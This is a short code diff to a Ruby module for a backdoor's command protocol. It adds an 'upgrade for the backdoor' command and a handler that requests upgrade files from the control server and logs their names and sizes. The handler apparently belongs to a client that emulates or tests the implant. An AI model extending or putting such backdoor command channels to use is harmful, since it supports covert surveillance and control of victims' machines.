@@ -32,6 +32,7 @@ module Command
   PROTO_UNINSTALL  = 0x0a       # Uninstall command
   PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
   PROTO_UPLOAD     = 0x0d       # A file to be saved
+  PROTO_UPGRADE    = 0x16       # Upgrade for the backdoor
   PROTO_EVIDENCE   = 0x09       # Upload of a log
   PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
 
@@ -204,7 +205,28 @@ module Command
       trace :info, "UPLOAD -- No uploads for me"
     end
   end
-  
+
+  # Protocol Upgrade
+  # ->  Crypt_K ( PROTO_UPGRADE )
+  # <-  Crypt_K ( PROTO_NO | PROTO_OK [ left, filename, content ] )
+  def receive_upgrade
+    trace :info, "UPGRADE"
+    resp = send_command(PROTO_UPGRADE)
+
+    # decode the response
+    command, tot, left, size = resp.unpack('i4')
+
+    if command == PROTO_OK then
+      filename = resp[12, resp.length].unpascalize
+      bytes = resp[16 + size, resp.length].unpack('i')
+      trace :info, "UPGRADE -- [#{filename}] #{bytes} bytes"
+
+      # recurse the request if there are other files to request
+      receive_upgrade if left != 0
+    else
+      trace :info, "UPGRADE -- No upgrade for me"
+    end
+  end
   
   # Protocol Download
   # ->  Crypt_K ( PROTO_DOWNLOAD )   
